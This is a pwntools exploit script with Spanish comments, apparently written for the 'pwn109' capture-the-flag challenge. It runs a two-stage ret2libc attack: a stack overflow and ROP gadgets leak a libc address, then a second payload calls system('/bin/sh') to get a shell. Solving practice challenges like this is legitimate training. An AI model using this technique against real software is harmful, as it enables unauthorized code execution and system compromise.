#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *
from pwn import p64


# Set up pwntools for the correct architecture
context.update(arch='x86_64')
context.binary = exe = ELF('./pwn109.elf')
context.log_level = 'info'

def start():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("10.10.190.25", 9009)

    return r

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

'''
[*] '/home/ismael/Challenges/Pwn/pwn109/pwn109.elf'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
'''

rop = ROP(exe)
if args.LOCAL:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
else:
    libc = ELF('./libc6_2.27-3ubuntu1.3_amd64.so', checksec=False)
# Encontrar gadgets para el ret del MOVABS de Ubuntu
# 
rdi_ret_gadget = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(["ret"])[0]

# Primera vuelta, leakear una función de libc y calcular base,
# y volver a main para ejecutar la cadena ret2libc a system
log.info("Primera vuelta")
payload = b''
# Stack smashing
payload += 0x28 * b"A"
# Cargamos en el stack la dirección de gets() y lo almacenamos
# en rdi para que luego lo imprima puts()
payload += p64(rdi_ret_gadget)
payload += p64(exe.got.gets)
payload += p64(exe.plt.puts)
# Después de puts, retornamos a main para la segunda vuelta
payload += p64(exe.symbols.main)


io.sendlineafter(b"Go ahead \xf0\x9f\x98\x8f\n", payload)

# Ya tenemos la dirección de gets leakeada, vamos a imprimir 
# la base de libc
address = u64(io.recv(8).strip().ljust(8, b"\x00"))
libc.address = address - libc.symbols.gets
log.info(f"Dirección de gets {address:x}")
log.info(f"Dirección de la libc: {libc.address:x}")


# Debug
log.info(f"Dirección rdi_ret_gadget: {rdi_ret_gadget:x}")
log.info(f"Dirección ret {ret:x}")
log.info(f"Dirección libc.symbols.system después del rebase: {libc.symbols.system:x}")
# write("payload.txt", payload)

# Segunda vuelta, ahora que tenemos la libc leakeada podemos
# saltar directamente a la dirección de la función de system

log.info("Segunda vuelta")

payload = b''
payload += 0x28 * b"A"
payload += p64(rdi_ret_gadget)
payload += p64(next(libc.search(b"/bin/sh")))
# ret para movabs de ubuntu :(
payload += p64(ret)
payload += p64(libc.symbols.system)

io.sendlineafter(b"Go ahead \xf0\x9f\x98\x8f\n", payload)

io.interactive()